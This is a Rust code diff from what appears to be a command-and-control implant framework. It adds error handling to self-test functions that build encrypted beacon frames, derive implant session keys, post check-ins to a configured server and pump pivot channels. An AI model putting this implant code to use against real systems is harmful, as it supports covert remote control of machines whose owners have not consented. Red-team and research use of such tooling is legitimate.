@@ -692,7 +692,7 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     // 0xA2 reached: session_key OK
 
     // Step 4: Test mem::register_key + encode_frame (the beacon frame builder).
-    crate::mem::register_key(key);
+    crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
     let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, b"test_info");
     // 0xA3 reached: encode_frame OK
@@ -723,7 +723,7 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     crate::mem::register_owned(config_plain);
     let kp = nyx_protocol::ImplantKeypair::generate();
     let key = kp.session_key(&cfg.server_pub);
-    crate::mem::register_key(key);
+    crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
 
     // Build SessionInfo (same as beacon_loop).
@@ -737,7 +737,7 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
         is_admin: crate::hostinfo::is_admin(),
     };
     let mut iw = nyx_protocol::wire::Writer::new();
-    info.encode(&mut iw);
+    info.encode(&mut iw).expect("test SessionInfo fields are tiny << MAX_BLOB_LEN");
     let info_plain = iw.into_bytes();
 
     // Check-in with SessionInfo payload.
@@ -766,7 +766,7 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     // Simulate task-loop first POST: encode empty TaskResponse batch + send.
     let frame2 = nyx_protocol::encode_frame(
         &pubkey, 1u64, &key,
-        &nyx_protocol::TaskResponse::encode_vec(&[]),
+        &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
     );
     let body = crate::transport::post_frame(
         cfg.server_host.as_bytes(), cfg.server_port,
@@ -798,7 +798,7 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let _ = crate::pivot::pump_channels();
     let frame3 = nyx_protocol::encode_frame(
         &pubkey, 2u64, &key,
-        &nyx_protocol::TaskResponse::encode_vec(&[]),
+        &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
     );
     let body3 = crate::transport::post_frame(
         cfg.server_host.as_bytes(), cfg.server_port,
@@ -1211,9 +1211,9 @@ pub unsafe extern "system" fn nyx_selftest_config() {
     // str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
     use nyx_protocol::wire::Writer;
     let mut w = Writer::new();
-    w.str("test.example");
+    w.str("test.example").expect("literal << MAX_BLOB_LEN");
     w.u16(9999);
-    w.str("/x");
+    w.str("/x").expect("literal << MAX_BLOB_LEN");
     w.u32(42);
     w.u8(7);
     w.u8(1); // tls = true
